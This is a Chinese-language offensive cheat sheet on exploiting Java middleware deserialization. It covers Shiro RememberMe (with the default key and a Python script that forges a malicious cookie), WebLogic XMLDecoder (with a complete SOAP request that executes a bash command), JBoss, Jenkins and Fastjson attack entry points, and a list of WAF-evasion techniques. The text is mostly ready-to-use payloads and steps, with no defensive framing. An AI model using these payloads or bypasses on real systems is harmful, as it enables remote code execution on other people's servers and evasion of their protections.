## 六、Java 主流中间件反序列化链

### 6.1 Shiro RememberMe（CVE-2016-4437）
```
特征：Cookie rememberMe=xxx，AES-128-CBC 加密，默认密钥硬编码
默认密钥：kPH+bIxk5D2deZiIxcaaaA==
检测：发送 rememberMe=1，响应出现 rememberMe=deleteMe
利用步骤：
1. 爆破密钥（ShiroExploit/ShiroAttack2 遍历 100+ 已知密钥）
2. 选定 Gadget（CB1 最稳，仅需 beanutils；其次 CC2-CC7/Groovy1/Spring1）
3. AES-CBC 加密序列化数据 → 写入 rememberMe Cookie
```
```python
# 构造 Shiro Cookie（Python 示例）
import base64, os
from Crypto.Cipher import AES
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
payload = open("cb1.ser", "rb").read()
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
iv = os.urandom(16)
cookie = base64.b64encode(iv + AES.new(key, AES.MODE_CBC, iv).encrypt(payload)).decode()
# Cookie: rememberMe=<cookie>
```

### 6.2 WebLogic T3/IIOP/XMLDecoder
```bash
# T3 协议（7001）：T3 握手后发送序列化数据（工具：weblogicScan / ysoserial 改造 / CVE-2015-4852 复现脚本）
# IIOP（3700）：CVE-2020-2555（Coherence 链）等
# XMLDecoder RCE（CVE-2017-10271 / CVE-2019-2725）：
```
```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array><void method="start"/></void>
</java>
</work:WorkContext></soapenv:Header><soapenv:Body/>
</soapenv:Envelope>
```

### 6.3 JBoss / Jenkins / 其他
```
# JBoss：/invoker/JMXInvokerServlet、/invoker/EJBInvokerServlet（CVE-2017-12149 等），POST 序列化数据
# Jenkins：/cli 接口 / POST config.xml（CVE-2026-53435：JEP-200 ClassFilter 放行核心/插件类，readResolve gadget + Stapler 反射路由 → 冒充用户/Script Console Groovy RCE/任意文件读）
# Fastjson/Jackson/Fastjson2：JSON 类反序列化，详见 fastjson-exploitation 技能（@type 绕过、Gadget-free、FNV-1a 碰撞）
# Hessian/Dubbo：RPC 反序列化，ysoserial-modified 提供 hessian 适配链
```

### 6.4 WAF 绕过（Java 反序列化流量层）
```
# 1. 分块传输（chunked），避免 WAF 完整组装
# 2. Content-Type 变换：application/octet-stream、;charset=utf-8、multipart/form-data 字段包裹
# 3. Gzip/Deflate 压缩（Content-Encoding: gzip）
# 4. 序列化数据混淆：插入垃圾数据、TC_RESET/TC_REFERENCE 嵌套、增加对象图深度
# 5. HTTP 参数污染（双 data 参数）、POST→GET 转换、Header 注入（X-Forwarded-For/Cookie/X-Token 携带 payload）
# 6. 编码变形：Base64 URL 编码、Hex URL 编码、Unicode 编码类名字段
```

